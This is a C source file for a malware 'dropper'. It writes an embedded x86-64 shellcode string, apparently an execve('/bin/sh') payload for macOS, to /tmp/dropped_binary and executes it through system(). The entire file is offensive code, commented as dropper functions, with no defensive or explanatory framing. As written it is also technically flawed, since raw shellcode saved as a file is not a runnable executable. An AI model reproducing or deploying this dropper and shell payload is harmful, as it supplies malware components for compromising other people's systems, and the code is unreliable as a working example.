#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <stdio.h>
#include <sys/sysctl.h>
#include <unistd.h>
#include <fcntl.h>


//start of the dropper functions
void save_payload_to_file(const unsigned char *payload, size_t payload_size, const char *output_path){
    FILE *fp = fopen(output_path, "wb");
    if (fp == NULL){
        perror("failed to open for writing");
        exit(EXIT_FAILURE);
    }
    fwrite(payload, 1, payload_size, fp);
    fclose(fp);
}


void execute_dropped_file(const char *file_path){
    if(system(file_path) != 0){
        perror("failed to execute dropped file");
    }
}//end of dropper functions 



int main(){
    unsigned char new_payload[] = "\x48\x31\xd2\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73"
"\x68\x00\x5f\x52\x57\x48\x89\xe6\x48\xc7\xc0\x3b\x00\x00"
"\x02\x0f\x05";

    size_t new_payload_size = sizeof(new_payload);
    const char *output_path = "/tmp/dropped_binary";


    //save the new payload to the file
    save_payload_to_file(new_payload, new_payload_size, output_path);

    //execute the dropped file
    execute_dropped_file(output_path);


    return 0;
}